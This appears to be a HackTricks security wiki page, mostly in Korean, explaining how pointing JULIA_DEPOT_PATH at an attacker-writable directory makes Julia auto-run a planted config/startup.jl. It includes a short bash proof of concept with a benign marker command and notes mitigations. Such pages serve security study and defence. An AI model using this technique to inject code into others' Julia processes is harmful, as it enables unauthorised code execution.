# macOS Julia Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` 및 `startup.jl`

Julia는 일반적으로 시작 시 첫 번째 depot에서 `config/startup.jl`을 실행합니다. `JULIA_DEPOT_PATH`는 depot 목록을 제어하므로, 공격자가 쓸 수 있는 tree를 가리키면 자동으로 로드되는 startup file을 리디렉션할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
trailing separator는 victim이 일반 packages를 계속 필요로 하는 경우 유용합니다. `julia --startup-file=no`는 이 startup file을 비활성화합니다. 시작하기 전에 해당 변수를 지우십시오. 이 변수는 package registries, environments, caches 및 code-loading locations도 제어하기 때문입니다.

## References

- [1] [Julia command-line interface: Startup file](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
